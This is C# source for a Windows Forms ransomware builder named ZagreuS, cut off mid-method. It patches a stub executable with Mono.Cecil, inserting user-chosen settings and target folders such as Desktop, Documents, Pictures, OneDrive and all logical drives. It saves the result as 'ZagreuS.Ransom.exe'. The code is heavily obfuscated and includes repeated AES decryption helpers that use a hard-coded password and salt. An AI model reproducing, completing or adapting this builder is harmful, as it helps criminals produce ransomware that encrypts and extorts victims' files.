using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Mono.Cecil.Cil;
using Mono.Cecil;


namespace Zagreus_Fixed_Source
{
    public partial class fRCWQdUOPAClUJZZPQmd : Form
    {

        private Button _Button2;
        private MsgBoxResult msg;
        private OpenFileDialog c;
        private string M6UfDi0ZfRtlYSRYyh0lM6UUGgreUUG;
        private string M6UfDi0ZfRtlYSRYyh0lM6UUGgreUUGsf;
        private string M6UfDi0ZfRtlYSRYyh0lM6UUGgreUUGsfdsfd;
        private string lYSRYyh0lM6UUGgreUUGsfds;
        private string lYSRYyh0lM6UUGgreUUGsfdsdgdg;
        private string lYSRYysfsh0lM6UUGgreUUGsfdsdgdgfg;
        private bool lYSRYysdfsh0lgM6UUGgreUUGsfdsdgdgfg;
        private bool lYSRYysdfsh0lgM6UUGgreUUGsfdsdgdgfgdg;
        private string lYSRYyssdfsh0lgM6UUGgrefUUGsfdsdgdgfg;
        private bool lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgp;
        private bool lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbg;
        private bool lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbgdf;
        private bool lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbgdfdads;
        private bool lYSRYyssdsffsh0lgM6UUGggrefUUGsfdsdgdgfgpbgdfdadssf;
        private bool lYSRsYyssdsffsh0lgM6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfd;
        private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds;
        private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds123;
        private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds123d;
        private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds123dsf;
        private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds34;
        private bool lYSRsYsyssdsffsh0lfgMd6dUUGggrefUUGsfdsdgdgfgpbgdfdadssfds34d;
        public static string url;

        public fRCWQdUOPAClUJZZPQmd()
        {
            InitializeComponent();
        }

        private void fRCWQdUOPAClUJZZPQmd_Load(object sender, EventArgs e)
        {

        }

        private void fRCWQdUOPAClUQm_Click(object sender, EventArgs e)
        {
            if (!File.Exists(Application.StartupPath + "\\stub\\cf4cba71fc6c3964520ae13dfca.exe"))
            {
                Interaction.MsgBox("stub not found!", MsgBoxStyle.Critical, "Warning");
                return;
            }
            AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath + "\\stub\\cf4cba71fc6c3964520ae13dfca.exe");
            foreach (ModuleDefinition module in assemblyDefinition.Modules)
            {
                foreach (TypeDefinition type in module.Types)
                {
                    foreach (MethodDefinition method in type.Methods)
                    {
                        if (!method.IsConstructor || !method.HasBody)
                        {
                            continue;
                        }
                        try
                        {
                            IEnumerator<Instruction> enumerator4 = method.Body.Instructions.GetEnumerator();
                            while (enumerator4.MoveNext())
                            {
                                Instruction current4 = enumerator4.Current;
                                if (current4.OpCode.Code == Code.Ldstr)
                                {
                                    string left = current4.Operand.ToString();
                                    if (Operators.CompareString(left, "[xFfM6DAxFM6UfDi0ZfRtlYSRYyh0lM6UUG]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = JnJhdfgfGRVgSrmt.Text;
                                    }
                                    if (Operators.CompareString(left, "[xFfM6DAxFM6UfDi0ZfRtlYSRYyh0lM6UUGtrr]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = TextBoxem.Text;
                                    }
                                    if (Operators.CompareString(left, "[xFfM6DAxFM6UfDi0ZfRtlYSRYyh0lM6UUGtrrdffd]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = TextBox92.Text;
                                    }
                                    if (Operators.CompareString(left, "[sxFfM6DAxFM6UfDi0ZfRtlYSRYyh0lM6UUGtrrdffd]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = JnJhdfgfGRVrmt.Text;
                                    }
                                    if (Operators.CompareString(left, "[tsxFfM6DAxFM6UfDi0ZfRtlYSRYyh0lM6UUGtrrdffd]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = TextBox789.Text;
                                    }
                                    if (Operators.CompareString(left, "[lYSRYyh0lM6UUGgreUUGgre9TPDi0ZfRtlYSR]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = nREJkHPJRmnREJkHPJRmaNnObVdOGNFCsSprVCsSprVvedQjVnf.Text;
                                    }
                                    if (Operators.CompareString(left, "[fsfslYSRYyh0lM6UUGgreUUGgre9TPDi0ZfRtlYSR]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = nREJkHPJRmaNnObVdOGNFCsSprVvedQjVnf.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[fsfsldgYSRYyh0fslM6daUUGgreUUGgre9TPDi0ZfRtlYSR]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = nREJkHPJRmaNnGNFCsSprVvedQjVnf.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[Di0ZfRtlYSRYyh0lM6UUGgre]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = nREJkHPJRmaNVdOGNFCsSprVvedQjVnf.Text;
                                    }
                                    if (Operators.CompareString(left, "[link]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = TextBox92.Text;
                                    }
                                    if (Operators.CompareString(left, "[ZfRtlYSRYyh0lddGgreUUGgre9T]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = check_desktop.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[reUUGgre9TPDi0ZfRtlYSRYyh0l]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = Check_Links.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[reUUGgre9TPDi0ZfRtlYSRYyh0lgggd]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = Check_Contacts.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[reUUGgre9fdfdTPDi0ZfRtlYSRYyh0lgggd]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = Check_Documents.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[reUUGgre9fdfdTPDi0ZfRtlYSRYyh0lgggddf]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = Check_Downloads.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[reUUGgre9fdfdTPgdgdDi0ZfRtlYSRYyh0lgggddf]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = Check_Pictures.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[reUdgUGgre9fdfddTPgdgdDi0ZfRtlYSRYyh0lgggddf]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = Check_Music.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[Gsfdsfddgdgfgpbgdfdadssfd]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = Check_OneDrive.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[Gsfdsfdddgdgfgpdbgdfdaddssfd]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = Check_SavedGames.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[gre9fdfdTPgdgdgre9fdfdTPgdgd]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = Check_Favorites.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[gre9fdfdTPgdgdgre9fdfdTPgdgdsfssfs]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = Check_Searches.Checked.ToString();
                                    }
                                    if (Operators.CompareString(left, "[gre9fdfgre9fdfdTPgdgdgre9fdfdTPgdgdsfssfsdTPgdgdgre9fdfdTPgdgdsfssfs]", TextCompare: false) == 0)
                                    {
                                        current4.Operand = Check_Videos.Checked.ToString();
                                    }
                                }
                            }
                        }
                        finally
                        {
                        }
                    }
                }
            }
            SaveFileDialog saveFileDialog = saveFileDialog1;
            saveFileDialog.FileName = "ZagreuS.Ransom.exe";
            saveFileDialog.Filter = "Application | *.exe";
            saveFileDialog.Title = "please select location where the loader should be saved.";
            saveFileDialog = null;
            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                assemblyDefinition.Write(saveFileDialog1.FileName);
                Interaction.MsgBox("\r\n" + saveFileDialog1.FileName, MsgBoxStyle.Information, "ZagreuS Builder");
            }
        }

        public static string statis(string statis1, string statis2)
        {
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
            byte[] array = new byte[32];
            byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(statis2));
            Array.Copy(sourceArray, 0, array, 0, 16);
            Array.Copy(sourceArray, 0, array, 15, 16);
            rijndaelManaged.Key = array;
            rijndaelManaged.Mode = CipherMode.ECB;
            ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
            byte[] array2 = Convert.FromBase64String(statis1);
            return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
        }

        private void fRCWQdUOPAClUJZZPQmd_FormClosing(object sender, FormClosingEventArgs e)
        {
            ProjectData.EndApp();
        }

        private void DeleteProfileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            object selectedItem = ListBox1.SelectedItem;
            if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.Desktop)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Desktop)", TextCompare: false) == 0);
                check_desktop.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.Links)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Links)", TextCompare: false) == 0);
                Check_Links.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.Contacts)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Contacts)", TextCompare: false) == 0);
                Check_Contacts.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.Documents)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Documents)", TextCompare: false) == 0);
                Check_Documents.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.Downloads)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Downloads)", TextCompare: false) == 0);
                Check_Downloads.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)", TextCompare: false) == 0);
                Check_Pictures.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)", TextCompare: false) == 0);
                Check_Music.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.OneDrive)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.OneDrive)", TextCompare: false) == 0);
                Check_OneDrive.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.Saved Games)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Saved Games)", TextCompare: false) == 0);
                Check_SavedGames.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.Favorites)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Favorites)", TextCompare: false) == 0);
                Check_Favorites.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.Searches)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Searches)", TextCompare: false) == 0);
                Check_Searches.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)", TextCompare: false) == 0);
                Check_Videos.Checked = false;
            }
            else if (Operators.ConditionalCompareObjectEqual(selectedItem, "System.Directory.GetLogicalDrives()", TextCompare: false))
            {
                ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(ListBox1.SelectedItem));
                ListBox1.Items.Remove(Operators.CompareString(ListBox1.Text, "System.Directory.GetLogicalDrives()", TextCompare: false) == 0);
                nREJkHPJRmaNnGNFCsSprVvedQjVnf.Checked = false;
            }
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Desktop)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.Desktop)");
                check_desktop.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Links)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.Links)");
                Check_Links.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Contacts)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.Contacts)");
                Check_Contacts.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Documents)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.Documents)");
                Check_Documents.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Downloads)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.Downloads)");
                Check_Downloads.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)");
                Check_Pictures.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)");
                Check_Music.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.OneDrive)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.OneDrive)");
                Check_OneDrive.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Saved Games)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.Saved Games)");
                Check_SavedGames.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Favorites)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.Favorites)");
                Check_Favorites.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.Searches)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.Searches)");
                Check_Searches.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)");
                Check_Videos.Checked = true;
            }
            else if (Operators.CompareString(ComboBox2.Text, "System.Directory.GetLogicalDrives()", TextCompare: false) == 0)
            {
                ListBox1.Items.Add("System.Directory.GetLogicalDrives()");
                nREJkHPJRmaNnGNFCsSprVvedQjVnf.Checked = true;
            }
        }

        private object ffRCWQdUOPACflUJZZPQmBjV(string IHeCAieeFsugYXCFB)
        {
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ffRCWQdUOPAClUJZZPQmBjV", salt);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
            object @string = default(object);
            try
            {
                byte[] array = Convert.FromBase64String(IHeCAieeFsugYXCFB);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.Close();
                @string = Encoding.UTF8.GetString(memoryStream.ToArray());
                return @string;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return @string;
            }
        }

        private object ffRCWQdUOPAClUsJZZPQmBjV(string IHeCAieeFsugYXCFB)
        {
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ffRCWQdUOPAClUJZZPQmBjV", salt);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
            object @string = default(object);
            try
            {
                byte[] array = Convert.FromBase64String(IHeCAieeFsugYXCFB);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.Close();
                @string = Encoding.UTF8.GetString(memoryStream.ToArray());
                return @string;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return @string;
            }
        }

        private object ffRCWQdUOPAClUsfJZZPQmBjV(string IHeCAieeFsugYXCFB)
        {
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ffRCWQdUOPAClUJZZPQmBjV", salt);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
            object @string = default(object);
            try
            {
                byte[] array = Convert.FromBase64String(IHeCAieeFsugYXCFB);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.Close();
                @string = Encoding.UTF8.GetString(memoryStream.ToArray());
                return @string;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return @string;
            }
        }

        private object ffRCWQdUOPfAClUJZZsfPQmBjV(string IHeCAieeFsugYXCFB)
        {
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ffRCWQdUOPAClUJZZPQmBjV", salt);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
            object @string = default(object);
            try
            {
                byte[] array = Convert.FromBase64String(IHeCAieeFsugYXCFB);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.Close();
                @string = Encoding.UTF8.GetString(memoryStream.ToArray());
                return @string;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return @string;
            }
        }

        private object ffRCWQdUOPAClUJfsZZPQmBjV(string IHeCAieeFsugYXCFB)
        {
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ffRCWQdUOPAClUJZZPQmBjV", salt);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
            object @string = default(object);
            try
            {
                byte[] array = Convert.FromBase64String(IHeCAieeFsugYXCFB);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.Close();
                @string = Encoding.UTF8.GetString(memoryStream.ToArray());
                return @string;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return @string;
            }
        }

        private object ffRCWQdUOPAClUJsZZPQmBjV(string IHeCAieeFsugYXCFB)
        {
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ffRCWQdUOPAClUJZZPQmBjV", salt);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
            object @string = default(object);
            try
            {
                byte[] array = Convert.FromBase64String(IHeCAieeFsugYXCFB);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.Close();
                @string = Encoding.UTF8.GetString(memoryStream.ToArray());
                return @string;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return @string;
            }
        }

        private object ffRCWQdUOPAClUJZfsZPQmBjV(string IHeCAieeFsugYXCFB)
        {
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ffRCWQdUOPAClUJZZPQmBjV", salt);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
            object @string = default(object);
            try
            {
                byte[] array = Convert.FromBase64String(IHeCAieeFsugYXCFB);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.Close();
                @string = Encoding.UTF8.GetString(memoryStream.ToArray());
                return @string;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return @string;
            }
        }

        private object ffRCWQdUOPAClUJsfZZPQmBjV(string IHeCAieeFsugYXCFB)
        {
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ffRCWQdUOPAClUJZZPQmBjV", salt);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
            object @string = default(object);
            try
            {
                byte[] array = Convert.FromBase64String(IHeCAieeFsugYXCFB);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.Close();
                @string = Encoding.UTF8.GetString(memoryStream.ToArray());
                return @string;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return @string;
            }
        }

        private object ffRCWQdUOPAClsUJZZPQmBjV(string IHeCAieeFsugYXCFB)
        {
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ffRCWQdUOPAClUJZZPQmBjV", salt);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
            object @string = default(object);
            try
            {
                byte[] array = Convert.FromBase64String(IHeCAieeFsugYXCFB);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.Close();
                @string = Encoding.UTF8.GetString(memoryStream.ToArray());
                return @string;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return @string;
            }
        }

        private object ffRCWQdUOPAClUdJZZPQmBjV(string IHeCAieeFsugYXCFB)
        {
            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ffRCWQdUOPAClUJZZPQmBjV", salt);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
            object @string = default(object);
            try
            {
                byte[] array = Convert.FromBase64String(IHeCAieeFsugYXCFB);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.Close();
                @string = Encoding.UTF8.GetString(memoryStream.ToArray());
                return @string;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return @string;
            }
        }

        private object ffRCWQdUOPAClUJZZPQmBjV(string IHeCAieeFsugYXCFB)
        {
